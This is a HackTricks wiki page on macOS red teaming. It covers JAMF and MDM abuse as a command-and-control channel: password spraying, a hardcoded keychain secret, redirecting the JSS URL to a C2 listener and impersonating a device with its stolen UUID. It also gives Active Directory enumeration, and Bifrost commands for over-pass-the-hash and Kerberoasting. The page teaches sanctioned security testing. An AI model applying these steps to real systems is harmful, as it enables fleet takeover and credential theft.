# macOS Red Teaming

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

**Get a hacker's perspective on your web apps, network, and cloud**

**Find and report critical, exploitable vulnerabilities with real business impact.** Use our 20+ custom tools to map the attack surface, find security issues that let you escalate privileges, and use automated exploits to collect essential evidence, turning your hard work into persuasive reports.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

## Abusing MDMs

* JAMF Pro: `jamf checkJSSConnection`
* Kandji

If you manage to **compromise admin credentials** to access the management platform, you can **potentially compromise all the computers** by distributing your malware in the machines.

For red teaming in MacOS environments it's highly recommended to have some understanding of how the MDMs work:

{% content-ref url="macos-mdm/" %}
[macos-mdm](macos-mdm/)
{% endcontent-ref %}

### Using MDM as a C2

A MDM will have permission to install, query or remove profiles, install applications, create local admin accounts, set firmware password, change the FileVault key...

In order to run your own MDM you need to **your CSR signed by a vendor** which you could try to get with [**https://mdmcert.download/**](https://mdmcert.download/). And to run your own MDM for Apple devices you could use [**MicroMDM**](https://github.com/micromdm/micromdm).

However, to install an application in an enrolled device, you still need it to be signed by a developer account... however, upon MDM enrolment the **device adds the SSL cert of the MDM as a trusted CA**, so you can now sign anything.

To enrol the device in a MDM you. need to install a **`mobileconfig`** file as root, which could be delivered via a **pkg** file (you could compress it in zip and when downloaded from safari it will be decompressed).

**Mythic agent Orthrus** uses this technique.

### Abusing JAMF PRO

JAMF can run **custom scripts** (scripts developed by the sysadmin), **native payloads** (local account creation, set EFI password, file/process monitoring...) and **MDM** (device configurations, device certificates...).

#### JAMF self-enrolment

Go to a page such as `https://<company-name>.jamfcloud.com/enroll/` to see if they have **self-enrolment enabled**. If they have it might **ask for credentials to access**.

You could use the script [**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py) to perform a password spraying attack.

Moreover, after finding proper credentials you could be able to brute-force other usernames with the next form:

![](<../../.gitbook/assets/image (107).png>)

#### JAMF device Authentication

<figure><img src="../../.gitbook/assets/image (167).png" alt=""><figcaption></figcaption></figure>

The **`jamf`** binary contained the secret to open the keychain which at the time of the discovery was **shared** among everybody and it was: **`jk23ucnq91jfu9aj`**.\
Moreover, jamf **persist** as a **LaunchDaemon** in **`/Library/LaunchAgents/com.jamf.management.agent.plist`**

#### JAMF Device Takeover

The **JSS** (Jamf Software Server) **URL** that **`jamf`** will use is located in **`/Library/Preferences/com.jamfsoftware.jamf.plist`**.\
This file basically contains the URL:

{% code overflow="wrap" %}
```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
	<key>is_virtual_machine</key>
	<false/>
	<key>jss_url</key>
	<string>https://halbornasd.jamfcloud.com/</string>
	<key>last_management_framework_change_id</key>
	<integer>4</integer>
[...]
```
{% endcode %}

So, an attacker could drop a malicious package (`pkg`) that **overwrites this file** when installed setting the **URL to a Mythic C2 listener from a Typhon agent** to now be able to abuse JAMF as C2.

{% code overflow="wrap" %}
```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```
{% endcode %}

#### JAMF Impersonation

In order to **impersonate the communication** between a device and JMF you need:

* The **UUID** of the device: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
* The **JAMF keychain** from: `/Library/Application\ Support/Jamf/JAMF.keychain` which contains the device certificate

With this information, **create a VM** with the **stolen** Hardware **UUID** and with **SIP disabled**, drop the **JAMF keychain,** **hook** the Jamf **agent** and steal its information.

#### Secrets stealing

<figure><img src="../../.gitbook/assets/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

You could also monitor the location `/Library/Application Support/Jamf/tmp/` for the **custom scripts** admins might want to execute via Jamf as they are **placed here, executed and removed**. These scripts **might contain credentials**.

However, **credentials** might be passed tho these scripts as **parameters**, so you would need to monitor `ps aux | grep -i jamf` (without even being root).

The script [**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) can listen for new files being added and new process arguments.

### macOS Remote Access

And also about **MacOS** "special" **network** **protocols**:

{% content-ref url="../macos-security-and-privilege-escalation/macos-protocols.md" %}
[macos-protocols.md](../macos-security-and-privilege-escalation/macos-protocols.md)
{% endcontent-ref %}

## Active Directory

In some occasions you will find that the **MacOS computer is connected to an AD**. In this scenario you should try to **enumerate** the active directory as you are use to it. Find some **help** in the following pages:

{% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

{% content-ref url="../../windows-hardening/active-directory-methodology/" %}
[active-directory-methodology](../../windows-hardening/active-directory-methodology/)
{% endcontent-ref %}

{% content-ref url="../../network-services-pentesting/pentesting-kerberos-88/" %}
[pentesting-kerberos-88](../../network-services-pentesting/pentesting-kerberos-88/)
{% endcontent-ref %}

Some **local MacOS tool** that may also help you is `dscl`:

```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```

Also there are some tools prepared for MacOS to automatically enumerate the AD and play with kerberos:

* [**Machound**](https://github.com/XMCyber/MacHound): MacHound is an extension to the Bloodhound audting tool allowing collecting and ingesting of Active Directory relationships on MacOS hosts.
* [**Bifrost**](https://github.com/its-a-feature/bifrost): Bifrost is an Objective-C project designed to interact with the Heimdal krb5 APIs on macOS. The goal of the project is to enable better security testing around Kerberos on macOS devices using native APIs without requiring any other framework or packages on the target.
* [**Orchard**](https://github.com/its-a-feature/Orchard): JavaScript for Automation (JXA) tool to do Active Directory enumeration.

### Domain Information

```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```

### Users

The three types of MacOS users are:

* **Local Users** — Managed by the local OpenDirectory service, they aren’t connected in any way to the Active Directory.
* **Network Users** — Volatile Active Directory users who require a connection to the DC server to authenticate.
* **Mobile Users** — Active Directory users with a local backup for their credentials and files.

The local information about users and groups is stored in in the folder _/var/db/dslocal/nodes/Default._\
For example, the info about user called _mark_ is stored in _/var/db/dslocal/nodes/Default/users/mark.plist_ and the info about the group _admin_ is in _/var/db/dslocal/nodes/Default/groups/admin.plist_.

In addition to using the HasSession and AdminTo edges, **MacHound adds three new edges** to the Bloodhound database:

* **CanSSH** - entity allowed to SSH to host
* **CanVNC** - entity allowed to VNC to host
* **CanAE** - entity allowed to execute AppleEvent scripts on host

```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```

More info in [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)

### Computer$ password

Get passwords using:

```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```

It's possible to access the **`Computer$`** password inside the System keychain.

### Over-Pass-The-Hash

Get a TGT for an specific user and service:

```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
       --hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```

Once the TGT is gathered, it's possible to inject it in the current session with:

```bash
bifrost --action asktgt --username test_lab_admin \
       --hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
       --enctype aes256 --domain test.lab.local
```

### Kerberoasting

```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
       --username [user] --hash [hash] --enctype [enctype]
```

With obtained service tickets it's possible to try to access shares in other computers:

```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```

## Accessing the Keychain

The Keychain highly probably contains sensitive information that if accessed without generating a prompt could help to move forward a red team exercise:

{% content-ref url="macos-keychain.md" %}
[macos-keychain.md](macos-keychain.md)
{% endcontent-ref %}

## External Services

MacOS Red Teaming is different from a regular Windows Red Teaming as usually **MacOS is integrated with several external platforms directly**. A common configuration of MacOS is to access to the computer using **OneLogin synchronised credentials, and accessing several external services** (like github, aws...) via OneLogin.

## Misc Red Team techniques

### Safari

When a file is downloaded in Safari, if its a "safe" file, it will be **automatically opened**. So for example, if you **download a zip**, it will be automatically decompressed:

<figure><img src="../../.gitbook/assets/image (226).png" alt=""><figcaption></figcaption></figure>

## References

* [**https://www.youtube.com/watch?v=IiMladUbL6E**](https://www.youtube.com/watch?v=IiMladUbL6E)
* [**https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6**](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
* [**https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0**](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
* [**Come to the Dark Side, We Have Apples: Turning macOS Management Evil**](https://www.youtube.com/watch?v=pOQOh07eMxY)
* [**OBTS v3.0: "An Attackers Perspective on Jamf Configurations" - Luke Roberts / Calum Hall**](https://www.youtube.com/watch?v=ju1IYWUv4ZA)

<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

**Get a hacker's perspective on your web apps, network, and cloud**

**Find and report critical, exploitable vulnerabilities with real business impact.** Use our 20+ custom tools to map the attack surface, find security issues that let you escalate privileges, and use automated exploits to collect essential evidence, turning your hard work into persuasive reports.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

